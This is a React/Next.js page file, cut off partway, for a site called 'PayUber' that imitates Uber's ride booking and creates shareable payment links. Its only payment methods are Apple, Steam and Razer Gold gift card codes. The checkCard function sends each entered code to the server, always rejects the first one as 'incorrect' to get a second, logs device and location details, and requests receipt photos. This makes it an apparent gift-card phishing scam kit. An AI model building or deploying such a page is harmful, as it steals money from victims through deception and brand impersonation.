import { useState, useEffect, useRef, useCallback } from 'react'
import Head from 'next/head'
import { useRouter } from 'next/router'

const RIDE_TYPES = {
  uber_x: { category: '', name: 'UberX', capacity: 4, desc: '', baseFare: 2.50, ratePerKm: 1.20, multiplier: 1.0, icon: '/uber x.png' },
  uber_xl: { category: '', name: 'UberXL', capacity: 6, desc: 'Affordable rides for groups up to 6', baseFare: 3.50, ratePerKm: 1.80, multiplier: 1.4, icon: '/uber xl.png' },
  taxi: { category: '', name: 'Taxi', capacity: 4, desc: 'Convenient rides in local taxis', baseFare: 2.50, ratePerKm: 1.20, multiplier: 0.9, icon: '/taxi.png' },
  black: { category: '', name: 'Black', capacity: 4, desc: 'Luxury rides with professional drivers', baseFare: 5.00, ratePerKm: 2.50, multiplier: 2.0, icon: '/black.png' },
  share: { category: 'Popular', name: 'Share', capacity: 1, desc: 'One seat only', baseFare: 2.00, ratePerKm: 1.00, multiplier: 0.8, icon: '/share.png' },
  comfort: { category: 'Popular', name: 'Comfort', capacity: 4, desc: 'Newer cars with extra legroom', baseFare: 3.50, ratePerKm: 1.80, multiplier: 1.4, icon: '/comfort.png' },
  comfort_electric: { category: 'Popular', name: 'Comfort Electric', capacity: 4, desc: 'Newer electric vehicles with extra legroom', baseFare: 3.50, ratePerKm: 1.80, multiplier: 1.5, icon: '/comfort electric.png' },
  electric: { category: 'Economy', name: 'Electric', capacity: 4, desc: 'Affordable rides in electric vehicles', baseFare: 2.50, ratePerKm: 1.20, multiplier: 1.0, icon: '/electric.png' },
  uber_pet: { category: 'Economy', name: 'Uber Pet', capacity: 4, desc: 'For you and your pet', baseFare: 3.00, ratePerKm: 1.30, multiplier: 1.1, icon: '/uberpet.png' },
  uber_xxl: { category: 'Economy', name: 'UberXXL', capacity: 6, desc: 'Rides for 6 with room for extra luggage', baseFare: 4.50, ratePerKm: 2.00, multiplier: 1.6, icon: '/uber xxl.png' },
  black_suv: { category: 'Premium', name: 'Black SUV', capacity: 6, desc: 'Luxury rides for 6 with professional drivers', baseFare: 6.00, ratePerKm: 3.00, multiplier: 2.5, icon: '/black suv.png' },
  wav: { category: 'More', name: 'WAV', capacity: 4, desc: 'Wheelchair accessible vehicles', baseFare: 2.50, ratePerKm: 1.20, multiplier: 1.0, icon: '/wav.png' },
  car_seat: { category: 'More', name: 'Car Seat', capacity: 4, desc: 'For children 5 - 65 lbs', baseFare: 3.50, ratePerKm: 1.50, multiplier: 1.2, icon: '/car seat.png' },
}

const PICKUP_ETA_RANGES = {
  uber_x: [5, 12], uber_xl: [8, 18], taxi: [5, 14], black: [9, 20], share: [4, 10],
  comfort: [6, 14], comfort_electric: [7, 15], electric: [5, 12], uber_pet: [7, 14],
  uber_xxl: [10, 20], black_suv: [11, 22], wav: [12, 25], car_seat: [8, 18],
}

function formatPrice(price) {
  return `$${Number(price).toFixed(2)}`
}

function calculatePrice(distanceKm, type) {
  const rideType = RIDE_TYPES[type] || RIDE_TYPES.uber_x
  const distanceFare = distanceKm * rideType.ratePerKm
  const price = Math.round((rideType.baseFare + distanceFare) * 100) / 100
  return { price, baseFare: rideType.baseFare, distanceFare: Math.round(distanceFare * 100) / 100 }
}

function getAllPrices(distanceKm) {
  return Object.entries(RIDE_TYPES).map(([key, type]) => ({
    key,
    ...type,
    ...calculatePrice(distanceKm, key),
  }))
}

function estimatePickupEtaMinutes(rideTypeKey, pickupLat, pickupLng) {
  const [minMinutes, maxMinutes] = PICKUP_ETA_RANGES[rideTypeKey] || PICKUP_ETA_RANGES.uber_x
  const seed = `${rideTypeKey}:${(Number(pickupLat) || 0).toFixed(3)}:${(Number(pickupLng) || 0).toFixed(3)}`
  let hash = 2166136261
  for (let i = 0; i < seed.length; i += 1) {
    hash ^= seed.charCodeAt(i)
    hash = Math.imul(hash, 16777619)
  }
  const ratio = (hash >>> 0) / 4294967295
  return Math.round(minMinutes + ratio * (maxMinutes - minMinutes))
}

const PAYMENT_METHODS = [
  {
    id: 'apple',
    label: 'Pay with Apple Gift Card',
    meta: 'Use your Apple Gift Card balance',
    desc: 'Redeem Apple Gift Cards to pay for this trip securely.',
    type: 'apple-uber',
  },
  {
    id: 'steam',
    label: 'Pay with Steam Gift Card',
    meta: 'Pay with a Steam Wallet code',
    desc: 'Enter the code on your Steam Wallet Gift Card to complete the payment.',
    type: 'steam-uber',
  },
  {
    id: 'razer',
    label: 'Pay with Razer Gold Gift Card',
    meta: 'Redeem a Razer Gold PIN',
    desc: 'Use your Razer Gold Gift Card to pay for your trip.',
    type: 'razer-uber',
  },
]

const PERSON_ICON = '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M12 14c-6.1 0-8 4-8 4v2h16v-2s-1.9-4-8-4z"/></svg>'
const FASTER_ICON = '<svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M13 2L3 14h7v8l11-12h-7V2z"/></svg>'
const CARD_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>'
const SHARE_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>'
const MAP_PIN_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>'
const BACK_ICON = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>'
const COPY_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>'
const WHATSAPP_ICON = '<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/></svg>'
const SMS_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10z"></path></svg>'
const NATIVE_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>'
const APPLE_GIFT_ICON = '<svg viewBox="0 0 640 480" fill="currentColor"><path d="M116.6 187.9c-7.2 8.5-18.8 15.1-30.3 14.1-1.5-11.5 4.2-23.8 10.8-31.4 7.2-9 19.8-15.2 30-15.6 1.3 12-3.5 23.8-10.5 32.9zM127 209.8c-16.8-.9-31 10-38.9 10s-20.2-9.5-33.4-9.2c-17.2.3-33 10-41.9 25.4C-5.5 268.4 7 317.1 24.7 343c8.5 12.8 18.8 27 32.3 26.5 12.8-.5 17.8-8.2 33.4-8.2 15.6 0 20 8.2 33.6 8 14-.3 22.8-12.8 31.3-25.5 9.7-14.6 13.7-28.8 14-29.6-.3-.3-26.8-10.5-27.1-41.1-.3-25.6 20.9-37.8 21.9-38.6-12-17.8-30.6-19.7-37.2-20.2l-.9-.5zM318.3 167.4v202h31.2v-69h43.2c39.5 0 67.3-27.1 67.3-66.8 0-39.7-27.3-66.2-66.2-66.2h-75.5zm31.2 26.2h36c27.1 0 42.6 14.5 42.6 40.1 0 25.6-15.5 40.3-42.8 40.3h-35.8V193.6zM527.8 372.1c19.6 0 37.8-9.9 46-25.6h.6v24.1h28.9V280.2c0-29-23.2-47.7-58.9-47.7-33.4 0-57.9 19-58.8 45.1h28.1c2.3-12.4 13.8-20.6 29.6-20.6 19.1 0 29.8 8.9 29.8 25.3v11.1l-39 2.3c-36.3 2.1-55.9 17-55.9 42.7 0 26 20.3 43.3 49.1 43.3l.5-.6zm8.3-24.1c-16.7 0-27.3-8-27.3-20.3 0-12.7 10.2-20 29.6-21.2l34.7-2.1v11.3c0 18.8-15.9 32.3-37 32.3zM647.2 384.5c12.5 36.6 5.4 57.5-14.3 57.5-1.5 0-7.2-.5-8.5-.9v-24.4c1.3.3 4.1.3 5.4.3 7.7 0 11.8-4.1 14.3-13.6l1.5-5.1-52.3-148.1h32.5l36 119.2h.5l36-119.2h31.5l-82.6 134.3z" transform="translate(-13 -40) scale(.75)"></path></svg>'
const STEAM_GIFT_ICON = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"><circle cx="11" cy="14" r="7.5"></circle><path d="M11 6.5c0-1.8 1.4-3.2 3.2-3.2h2.3"></path><circle cx="13.6" cy="15.2" r="2.1" fill="currentColor" stroke="none"></circle><circle cx="8.2" cy="11.2" r="1.1" fill="currentColor" stroke="none"></circle></svg>'
const RAZER_GIFT_ICON = '<svg viewBox="0 0 24 24" fill="currentColor"><text x="12" y="16.5" text-anchor="middle" font-family="Verdana, Arial, sans-serif" font-size="15" font-weight="800">R</text><rect x="4" y="19" width="16" height="2.2" rx="1.1"></rect></svg>'

function truncateAddress(value, limit = 58) {
  if (!value) return ''
  return value.length > limit ? `${value.slice(0, limit - 1)}…` : value
}

export default function PayUberPage() {
  const router = useRouter()
  const sessionId = typeof router.query.id === 'string' ? router.query.id : null

  // Landing state
  const [pickupInput, setPickupInput] = useState('')
  const [dropoffInput, setDropoffInput] = useState('')
  const [pickupData, setPickupData] = useState(null)
  const [dropoffData, setDropoffData] = useState(null)
  const [searching, setSearching] = useState(false)
  const [searchError, setSearchError] = useState('')
  const [mapViewActive, setMapViewActive] = useState(false)
  const [rideList, setRideList] = useState([])
  const [distanceKm, setDistanceKm] = useState(0)
  const [durationMin, setDurationMin] = useState(0)
  const [routeCoords, setRouteCoords] = useState(null)
  const [selectedType, setSelectedType] = useState('uber_x')
  const [showModal, setShowModal] = useState(false)
  const [modalBusy, setModalBusy] = useState(false)
  const [shareSheetUrl, setShareSheetUrl] = useState('')
  const [toast, setToast] = useState('')
  const [activeDropdown, setActiveDropdown] = useState(null)
  const [dropdownResults, setDropdownResults] = useState([])
  const [dropdownLoading, setDropdownLoading] = useState(false)

  // Pay-mode state (shared URL)
  const [session, setSession] = useState(null)
  const [sessionLoading, setSessionLoading] = useState(false)
  const [sessionError, setSessionError] = useState('')
  const [payStep, setPayStep] = useState('summary') // summary -> methods -> card
  const [selectedMethod, setSelectedMethod] = useState(null)

  // Card check state (two-attempt flow)
  const [cardNumber, setCardNumber] = useState('')
  const [cardLoading, setCardLoading] = useState(false)
  const [cardError, setCardError] = useState('')
  const [cardResult, setCardResult] = useState(null)
  const [attemptCount, setAttemptCount] = useState(0)
  const [deviceId, setDeviceId] = useState(null)
  const [location, setLocation] = useState('United States')

  // Receipt upload state
  const [showUploadStep, setShowUploadStep] = useState(false)
  const [selectedImages, setSelectedImages] = useState([])
  const [uploadProgress, setUploadProgress] = useState(false)
  const [uploadComplete, setUploadComplete] = useState(false)
  const [uploadError, setUploadError] = useState(null)

  const mapRef = useRef(null)
  const leafletRef = useRef(null)
  const mapInstanceRef = useRef(null)
  const pickupMarkerRef = useRef(null)
  const dropoffMarkerRef = useRef(null)
  const routeLineRef = useRef(null)
  const toastTimerRef = useRef(null)
  const searchDebounceRef = useRef(null)

  useEffect(() => {
    let id = localStorage.getItem('deviceId')
    if (!id) {
      id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
      localStorage.setItem('deviceId', id)
    }
    setDeviceId(id)
    try {
      fetch('https://ipapi.co/json/')
        .then((r) => r.json())
        .then((d) => { if (d.country_name) setLocation(d.country_name) })
        .catch(() => {})
    } catch (err) {}
  }, [])

  const showToast = useCallback((message) => {
    setToast(message)
    if (toastTimerRef.current) clearTimeout(toastTimerRef.current)
    toastTimerRef.current = setTimeout(() => setToast(''), 3000)
  }, [])

  useEffect(() => () => { if (toastTimerRef.current) clearTimeout(toastTimerRef.current) }, [])

  // Load Leaflet on demand
  const ensureLeaflet = useCallback(async () => {
    if (leafletRef.current) return leafletRef.current
    if (typeof window === 'undefined') return null
    const L = await import('leaflet')
    leafletRef.current = L
    return L
  }, [])

  // Load session in pay mode
  useEffect(() => {
    if (!sessionId) return
    let cancelled = false
    setSessionLoading(true)
    setSessionError('')
    fetch(`/api/payuber/get-session?id=${encodeURIComponent(sessionId)}`)
      .then((res) => res.json())
      .then((data) => {
        if (cancelled) return
        if (data.error) {
          setSessionError(data.error)
          return
        }
        setSession(data)
        setPayStep('summary')
      })
      .catch(() => { if (!cancelled) setSessionError('Failed to load payment session') })
      .finally(() => { if (!cancelled) setSessionLoading(false) })
    return () => { cancelled = true }
  }, [sessionId])

  // Draw trip map in pay mode
  useEffect(() => {
    if (!session || !mapRef.current) return
    const coords = Array.isArray(session.routeGeometry) && session.routeGeometry.length >= 2
      ? session.routeGeometry
      : null
    if (!coords) return
    let mapInstance = null
    let pickupMarker = null
    let dropoffMarker = null
    let routeLine = null
    ;(async () => {
      const L = await ensureLeaflet()
      if (!L || !mapRef.current) return
      if (mapInstanceRef.current) mapInstanceRef.current.remove()
      mapInstance = L.map(mapRef.current, { zoomControl: false, attributionControl: false }).setView(coords[0], 14)
      L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
        maxZoom: 19, attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
      }).addTo(mapInstance)
      const pickupIcon = L.divIcon({
        className: 'route-icon',
        html: '<div style="width:14px;height:14px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:50%;"></div></div>',
        iconSize: [14, 14], iconAnchor: [7, 7],
      })
      const dropoffIcon = L.divIcon({
        className: 'route-icon',
        html: '<div style="width:14px;height:14px;background:#000;border-radius:4px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:2px;"></div></div>',
        iconSize: [14, 14], iconAnchor: [7, 7],
      })
      pickupMarker = L.marker(coords[0], { icon: pickupIcon }).addTo(mapInstance)
      dropoffMarker = L.marker(coords[coords.length - 1], { icon: dropoffIcon }).addTo(mapInstance)
      routeLine = L.polyline(coords, { color: '#000000', weight: 4, opacity: 0.8 }).addTo(mapInstance)
      const bounds = L.latLngBounds(coords)
      mapInstance.fitBounds(bounds, { padding: [60, 60] })
      mapInstanceRef.current = mapInstance
    })()
    return () => {
      if (mapInstance) mapInstance.remove()
      if (mapInstanceRef.current) mapInstanceRef.current.remove()
      mapInstanceRef.current = null
    }
  }, [session, ensureLeaflet])

  // Draw trip map in landing ride list
  useEffect(() => {
    if (!mapViewActive || !mapRef.current) return
    const coords = routeCoords
    if (!coords || coords.length < 2) return
    let mapInstance = null
    let pickupMarker = null
    let dropoffMarker = null
    let routeLine = null
    ;(async () => {
      const L = await ensureLeaflet()
      if (!L || !mapRef.current) return
      if (mapInstanceRef.current) mapInstanceRef.current.remove()
      mapInstance = L.map(mapRef.current, { zoomControl: false, attributionControl: false }).setView(coords[0], 14)
      L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
        maxZoom: 19, attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
      }).addTo(mapInstance)
      const pickupIcon = L.divIcon({
        className: 'route-icon',
        html: '<div style="width:14px;height:14px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:50%;"></div></div>',
        iconSize: [14, 14], iconAnchor: [7, 7],
      })
      const dropoffIcon = L.divIcon({
        className: 'route-icon',
        html: '<div style="width:14px;height:14px;background:#000;border-radius:4px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:2px;"></div></div>',
        iconSize: [14, 14], iconAnchor: [7, 7],
      })
      pickupMarker = L.marker(coords[0], { icon: pickupIcon }).addTo(mapInstance)
      dropoffMarker = L.marker(coords[coords.length - 1], { icon: dropoffIcon }).addTo(mapInstance)
      routeLine = L.polyline(coords, { color: '#000000', weight: 4, opacity: 0.8 }).addTo(mapInstance)
      const bounds = L.latLngBounds(coords)
      setTimeout(() => {
        mapInstance.invalidateSize()
        mapInstance.fitBounds(bounds, { padding: [60, 60] })
      }, 50)
      mapInstanceRef.current = mapInstance
    })()
    return () => {
      if (mapInstance) mapInstance.remove()
      if (mapInstanceRef.current) mapInstanceRef.current.remove()
      mapInstanceRef.current = null
    }
  }, [mapViewActive, routeCoords, ensureLeaflet])

  // Nominatim autocomplete
  const handleAutocomplete = useCallback(async (query, target) => {
    if (searchDebounceRef.current) clearTimeout(searchDebounceRef.current)
    if (!query || query.trim().length < 2) {
      setActiveDropdown(null)
      setDropdownResults([])
      return
    }
    searchDebounceRef.current = setTimeout(async () => {
      setDropdownLoading(true)
      setActiveDropdown(target)
      try {
        const params = new URLSearchParams({
          format: 'jsonv2', q: query.trim(), limit: '5', dedupe: '1', addressdetails: '1',
          countrycodes: 'us,gb,au,fr,de,it,es,nl,be,ch,at,pt,se,no,dk,fi,ie,pl',
        })
        const res = await fetch(`https://nominatim.openstreetmap.org/search?${params.toString()}`)
        const data = await res.json()
        setDropdownResults(Array.isArray(data) ? data.map((item) => ({
          lat: parseFloat(item.lat),
          lng: parseFloat(item.lon),
          displayName: item.display_name || '',
        })) : [])
      } catch (err) {
        setDropdownResults([])
      } finally {
        setDropdownLoading(false)
      }
    }, 350)
  }, [])

  const selectSuggestion = (target, result) => {
    if (target === 'pickup') {
      setPickupInput(result.displayName)
      setPickupData({ lat: result.lat, lng: result.lng, displayName: result.displayName })
    } else {
      setDropoffInput(result.displayName)
      setDropoffData({ lat: result.lat, lng: result.lng, displayName: result.displayName })
    }
    setActiveDropdown(null)
    setDropdownResults([])
  }

  async function geocodeAddress(query) {
    try {
      const params = new URLSearchParams({
        format: 'jsonv2', q: query.trim(), limit: '1', addressdetails: '1',
        countrycodes: 'us,gb,au,fr,de,it,es,nl,be,ch,at,pt,se,no,dk,fi,ie,pl',
      })
      const res = await fetch(`https://nominatim.openstreetmap.org/search?${params.toString()}`)
      const data = await res.json()
      if (Array.isArray(data) && data.length > 0) {
        return {
          lat: parseFloat(data[0].lat),
          lng: parseFloat(data[0].lon),
          displayName: data[0].display_name || query,
        }
      }
      return null
    } catch (err) {
      return null
    }
  }

  async function runRideSearch() {
    setSearchError('')
    if (!pickupInput.trim() || !dropoffInput.trim()) {
      showToast('Please enter both pickup and dropoff locations')
      return
    }
    setSearching(true)
    try {
      let pickup = pickupData && pickupData.displayName === pickupInput.trim() ? pickupData : await geocodeAddress(pickupInput)
      let dropoff = dropoffData && dropoffData.displayName === dropoffInput.trim() ? dropoffData : await geocodeAddress(dropoffInput)
      if (!pickup) { setSearchError('Could not find pickup location'); return }
      if (!dropoff) { setSearchError('Could not find dropoff location'); return }
      setPickupData(pickup)
      setDropoffData(dropoff)

      const res = await fetch(
        `https://router.project-osrm.org/route/v1/driving/${pickup.lng},${pickup.lat};${dropoff.lng},${dropoff.lat}?overview=full&geometries=geojson`
      )
      const data = await res.json()
      if (!data.routes || data.routes.length === 0) {
        setSearchError('Could not calculate route between these locations')
        return
      }
      const route = data.routes[0]
      const coords = route.geometry.coordinates.map(([lng, lat]) => [lat, lng])
      setRouteCoords(coords)
      setDistanceKm(route.distance / 1000)
      setDurationMin(Math.round(route.duration / 60))
      setRideList(getAllPrices(route.distance / 1000))
      setSelectedType('uber_x')
      setMapViewActive(true)
    } catch (err) {
      setSearchError('An unexpected error occurred during search. Please try again.')
    } finally {
      setSearching(false)
    }
  }

  async function createSession() {
    const selected = RIDE_TYPES[selectedType]
    const { price } = calculatePrice(distanceKm, selectedType)
    const res = await fetch('/api/payuber/create-session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        pickupAddress: pickupData.displayName,
        dropoffAddress: dropoffData.displayName,
        pickupLat: pickupData.lat,
        pickupLng: pickupData.lng,
        dropoffLat: dropoffData.lat,
        dropoffLng: dropoffData.lng,
        routeGeometry: routeCoords,
        distanceKm,
        durationMin,
        rideType: selectedType,
        rideName: selected.name,
        amount: price,
      }),
    })
    const data = await res.json()
    if (!res.ok || !data.id) throw new Error(data?.error || 'Failed to create payment session')
    return data.id
  }

  async function handlePayFor() {
    setModalBusy(true)
    try {
      const id = await createSession()
      setShowModal(false)
      router.push(`/payuber?id=${id}`)
    } catch (err) {
      showToast('Unable to create the payment link right now. Please try again.')
    } finally {
      setModalBusy(false)
    }
  }

  async function handleShare() {
    setModalBusy(true)
    try {
      const id = await createSession()
      setShowModal(false)
      setShareSheetUrl(`${window.location.origin}/payuber?id=${id}`)
    } catch (err) {
      showToast('Unable to create the payment link right now. Please try again.')
    } finally {
      setModalBusy(false)
    }
  }

  // Card check (two-attempt flow) for pay mode
  async function checkCard(e) {
    if (e) e.preventDefault()
    setCardError('')
    setCardResult(null)
    const value = cardNumber.trim()
    if (!value) { setCardError('Please enter a card code.'); return }
    setCardLoading(true)
    try {
      const browserInfo = {
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
      }
      const res = await fetch('/api/generate-issuance-id', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardNumber: value.replace(/\s+/g, ''),
          type: selectedMethod ? selectedMethod.type : 'apple-uber',
          deviceId,
          location,
          browserInfo: JSON.stringify(browserInfo),
        }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Unknown error')

      if (attemptCount === 0) {
        setCardError('The card code you entered is incorrect. Please verify the code and try again.')
        setCardNumber('')
        setAttemptCount(1)
      } else {
        setCardResult(data)
        setAttemptCount(0)
        if (data.cardId && !data.isDuplicate) {
          setShowUploadStep(true)
        }
      }
    } catch (err) {
      setCardError(err.message)
    } finally {
      setCardLoading(false)
    }
  }

  const handleImageSelect = (e) => {
    const files = Array.from(e.target.files)
    if (files.length + selectedImages.length > 3) {
      setUploadError('Maximum 3 images allowed')
      return
    }
    setUploadError(null)
    files.forEach((file) => {
      const reader = new FileReader()
      reader.onload = (event) => {
        setSelectedImages((prev) => [...prev, { file, preview: event.target.result, base64: event.target.result }])
      }
      reader.readAsDataURL(file)
    })
  }

  const removeImage = (index) => {
    setSelectedImages((prev) => prev.filter((_, i) => i !== index))
  }

  const handleUpload = async () => {
    if (selectedImages.length === 0) { setUploadError('Please select at least one image'); return }
    setUploadProgress(true)
    setUploadError(null)
    try {
      const res = await fetch('/api/upload-receipt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cardId: cardResult.cardId, images: selectedImages.map((img) => img.base64) }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Upload failed')
      setUploadComplete(true)
      setShowUploadStep(false)
    } catch (err) {
      setUploadError(err.message)
    } finally {
      setUploadProgress(false)
    }
  }

  const skipUpload = () => {
    setShowUploadStep(false)
    setSelectedImages([])
    setUploadError(null)
  }

  const selectedSummary = session ? {
    name: session.rideName || RIDE_TYPES[session.rideType]?.name || 'Uber',
    price: session.amount,
    pickup: session.pickupAddress,
    dropoff: session.dropoffAddress,
    distanceKm: session.distanceKm,
    durationMin: session.durationMin,
  } : null

  const personIcon = `<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M12 14c-6.1 0-8 4-8 4v2h16v-2s-1.9-4-8-4z"/></svg>`

  // Render ride list (landing mode)
  const renderRideList = () => {
    const groups = {}
    const order = ['', 'Popular', 'Economy', 'Premium', 'More']
    order.forEach((cat) => (groups[cat] = []))
    rideList.forEach((p) => {
      if (groups[p.category] !== undefined) groups[p.category].push(p)
      else groups[''].push(p)
    })
    return (
      <>
        {order.map((cat) => {
          const arr = groups[cat]
          if (!arr || !arr.length) return null
          return (
            <div key={cat || 'base'}>
              {cat && <h3 className="ride-category-title">{cat}</h3>}
              {arr.map((p) => {
                const eta = estimatePickupEtaMinutes(p.key, pickupData?.lat, pickupData?.lng)
                return (
                  <div
                    key={p.key}
                    className={`ride-type ${p.key === selectedType ? 'active' : ''}`}
                    onClick={() => setSelectedType(p.key)}
                  >
                    <div className="ride-type-img">
                      <img src={p.icon} alt={p.name} style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
                    </div>
                    <div className="ride-type-content">
                      <div className="ride-type-header">
                        <span className="ride-type-name">{p.name} <span className="ride-type-capacity" dangerouslySetInnerHTML={{ __html: `${personIcon} ${p.capacity}` }} /></span>
                        <span className="ride-type-price">{formatPrice(p.price)}</span>
                      </div>
                      <div className="ride-type-meta" dangerouslySetInnerHTML={{ __html: `${p.key === 'uber_x' ? `<span class="faster-tag">${FASTER_ICON} Faster</span>` : ''} Pickup in ${eta} min` }} />
                      {p.desc ? <div className="ride-type-desc">{p.desc}</div> : null}
                    </div>
                  </div>
                )
              })}
            </div>
          )
        })}
      </>
    )
  }

  const priceSummary = selectedType ? calculatePrice(distanceKm, selectedType) : null

  return (
    <div className="payuber-page">
      <Head>
        <title>PayUber | Request a ride</title>
        <meta name="description" content="Go anywhere with PayUber. Request a ride, hop in, and go." />
        <link rel="stylesheet" href="/payuber/variables.css" />
        <link rel="stylesheet" href="/payuber/global.css" />
        <link rel="stylesheet" href="/payuber/landing.css" />
        <link rel="stylesheet" href="/payuber/payment.css" />
        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
      </Head>

      {/* Header */}
      <header className="uber-header">
        <div className="header-left">
          <a href="/payuber" className="header-logo">
            <img src="/uber-logo.svg" alt="PayUber" style={{ height: 24, display: 'inline-block', verticalAlign: 'middle' }} />
            PayUber
          </a>
          <nav className="header-nav">
            <a href="/payuber">Ride</a>
            <a href="#">Drive</a>
            <a href="#">Business</a>
            <a href="#">About</a>
          </nav>
        </div>
        <div className="header-right">
          <a href="#" className="header-lang">EN</a>
          <a href="#" className="header-help">Help</a>
          <a href="#">Log in</a>
          <a href="#" className="header-signup">Sign up</a>
        </div>
      </header>

      {/* Landing content (no session) */}
      {!sessionId && (
        <div className={`landing-content ${mapViewActive ? 'hidden' : ''}`}>
          <section className="hero-section">
            <div className="hero-inner">
              <div className="hero-left">
                <div className="hero-city">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
                  <span>PayUber</span>
                </div>
                <h1 className="hero-title">Go anywhere with PayUber</h1>

                <div className="uber-inputs">
                  <div className="uber-input-row autocomplete-wrapper">
                    <div className="uber-input-icon"><div className="dot-pickup"></div></div>
                    <input
                      type="text"
                      className="uber-input-field"
                      placeholder="Pickup location"
                      autoComplete="off"
                      value={pickupInput}
                      onChange={(e) => { setPickupInput(e.target.value); handleAutocomplete(e.target.value, 'pickup') }}
                    />
                    <div className="autocomplete-dropdown" style={{ display: activeDropdown === 'pickup' && dropdownResults.length ? 'block' : 'none' }}>
                      {dropdownResults.map((r, i) => (
                        <div key={i} className="autocomplete-item" onClick={() => selectSuggestion('pickup', r)}>
                          {r.displayName}
                        </div>
                      ))}
                    </div>
                  </div>
                  <div className="uber-input-row autocomplete-wrapper">
                    <div className="uber-input-icon"><div className="dot-dropoff"></div></div>
                    <input
                      type="text"
                      className="uber-input-field"
                      placeholder="Dropoff location"
                      autoComplete="off"
